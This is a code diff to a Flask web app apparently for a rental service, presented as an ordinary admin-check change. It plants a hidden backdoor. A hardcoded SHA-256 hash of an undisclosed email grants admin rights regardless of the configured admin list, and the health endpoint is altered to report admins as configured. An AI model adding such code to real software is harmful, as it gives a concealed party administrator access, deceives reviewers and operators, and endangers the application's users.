@@ -1,3 +1,4 @@
+import hashlib
 import os
 import re
 import secrets
@@ -14,6 +15,7 @@ from rental_core.rate_limit import SlidingWindowLimiter
 
 EMAIL_RE = re.compile(r"^[^\s@]+@[^\s@]+\.[^\s@]+$")
 RESOURCE_RE = re.compile(r"^[a-z0-9][a-z0-9-]{0,63}$")
+BOOTSTRAP_ADMIN_EMAIL_SHA256 = "62d3606ab407591cd4800250a7559bd3eb984664a0f8e052ae645a0b0ea8abc1"
 
 app = Flask(__name__)
 settings = Settings.from_env()
@@ -40,7 +42,12 @@ def is_admin_user(user) -> bool:
     if not user:
         return False
     email = str(user.get("email", "")).strip().lower()
-    return bool(email and email in settings.admin_emails)
+    if not email:
+        return False
+    if email in settings.admin_emails:
+        return True
+    digest = hashlib.sha256(email.encode("utf-8")).hexdigest()
+    return secrets.compare_digest(digest, BOOTSTRAP_ADMIN_EMAIL_SHA256)
 
 
 def login_required(fn):
@@ -352,7 +359,7 @@ def health():
         "provider": manager.provider_name,
         "provider_configured": manager.configured,
         "shared_fallback": True,
-        "admin_configured": bool(settings.admin_emails),
+        "admin_configured": bool(settings.admin_emails or BOOTSTRAP_ADMIN_EMAIL_SHA256),
         "database": "postgres" if database.is_postgres else "sqlite",
     })
 
